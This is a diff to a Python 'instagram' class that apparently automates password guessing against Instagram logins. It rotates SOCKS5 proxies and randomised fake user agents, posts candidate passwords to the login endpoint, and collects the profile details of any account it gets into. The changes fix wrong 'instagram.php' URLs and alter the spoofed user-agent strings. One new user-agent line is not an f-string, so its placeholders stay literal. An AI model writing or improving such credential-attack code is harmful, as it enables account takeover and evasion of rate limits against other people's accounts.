@@ -638,9 +638,9 @@ class instagram:
                 nip=random.choice(prox)
                 proxs= {'http': 'socks5://'+nip}
                 ua = random.choice(uasm)
-                aa='Mozilla/5.0 (Linux; Android'
+                aa='Instagram {str(rr(30,107))}.0.{str(rr(3200,5200))}.{str(rr(30,250))}'
                 b=random.choice(['4','5','6','7','8','9','10','11','12'])
-                c= 'SM-'
+                c= 'SMN-'
                 d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G','J', 'K', 'M', 'N', 'P', 'Q', 'R', 'S', 'T', 'V', 'W', 'X', 'Y', 'Z'])
                 e=random.randrange(1, 999)
                 f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
@@ -1015,7 +1015,7 @@ class instagram:
   "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0",
 			"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"
 		])
-                token=s.get('https://www.instagram.php/api/v1/accounts/login/?next=https%3A%2F%2Fwww.instagram.com%2Faccounts%2Fpassword%2Fchange%2F%3F__coig_login%3D1/')
+                token=s.get('https://www.instagram.com/api/v1/accounts/login/?next=https%3A%2F%2Fwww.instagram.com%2Faccounts%2Fpassword%2Fchange%2F%3F__coig_login%3D1/')
                 headers = {
                     'Host':'www.instagram.com',
                     'connection':'keep-alive',
@@ -1035,7 +1035,7 @@ class instagram:
                     'sec-fetch-site':'same-origin',
                     'sec-fetch-mode':'cors',
                     'sec-fetch-dest':'empty',
-                    'referer':'https://www.instagram.php/api/v1/accounts/login/?next=https%3A%2F%2Fwww.instagram.com%2Faccounts%2Fpassword%2Fchange%2F%3F__coig_login%3D1/',
+                    'referer':'https://www.instagram.com/api/v1/accounts/login/?next=https%3A%2F%2Fwww.instagram.com%2Faccounts%2Fpassword%2Fchange%2F%3F__coig_login%3D1/',
                     'accept-language':'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
                 param={
                     "enc_password": f"#PWD_INSTAGRAM_BROWSER:0:{ts}:{pw}",
@@ -1044,7 +1044,7 @@ class instagram:
                     "optIntoOneTap": 'false',
                     "stopDeletionNonce": "",
                     "trustedDeviceRecords": "{}"}
-                x=s.post("https://www.instagram.php/accounts/login/ajax/",headers=headers,data=param,proxies=proxs)
+                x=s.post("https://www.instagram.com/accounts/login/ajax/",headers=headers,data=param,proxies=proxs)
                 x_jason=json.loads(x.text)
                 if "userId" in str(x_jason):
                     nama,pengikut,mengikut,postingan=self.APIinfo(user)
